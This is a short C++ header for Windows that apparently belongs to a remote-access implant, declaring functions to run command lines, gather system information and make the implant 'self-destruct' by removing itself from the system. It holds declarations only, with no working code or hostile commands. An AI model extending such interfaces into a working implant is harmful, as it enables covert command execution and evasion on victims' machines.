#ifndef CMD_H
#define CMD_H

#include <windows.h>
#include <string>
#include <vector>

/**
 * Functions for command line execution
*/
LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut);
LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize);

/**
 * Stops a given implant and removes it from the system
*/
void SelfDestruct();

/**
 * Get basic system information about this system
*/
std::string SysInfo();

#endif